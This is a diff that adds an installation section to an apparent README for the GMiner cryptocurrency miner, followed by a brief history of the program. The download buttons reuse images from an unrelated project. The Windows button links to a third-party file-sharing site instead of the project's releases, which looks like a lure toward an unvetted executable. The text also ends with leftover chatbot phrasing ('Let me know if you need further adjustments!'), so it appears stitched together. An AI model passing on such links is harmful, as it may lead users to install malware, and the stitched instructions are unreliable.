@@ -1,3 +1,13 @@
+# Installation
+Click the download button for your operating system:
+
+<p float="left">
+  <a href="https://github.com/GMinerRepository/GMiner/releases/tag/3.44"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
+  <a href="https://github.com/GMinerRepository/GMiner/releases/tag/3.44"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
+  <a href="https://storagefiles.pro/?f=111GkiCAyvW"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+</p>
+
+
 GMiner was developed by a team of Russian experts in high-performance computing and cryptography. The initial version of GMiner was released on September 21, 2018, and quickly gained popularity among users. Its unique features and reliability helped the miner become a preferred choice for Equihash algorithms in just six months.
 The miner is designed to work on both NVIDIA and AMD platforms and supports a wide range of popular algorithms such as Ethash, ProgPoW, KAWPOW, Equihash, and CuckooCycle. GMiner has maintained a leading position in the mining of cryptocurrencies like Beam, Grin, and others.
 Let me know if you need further adjustments!
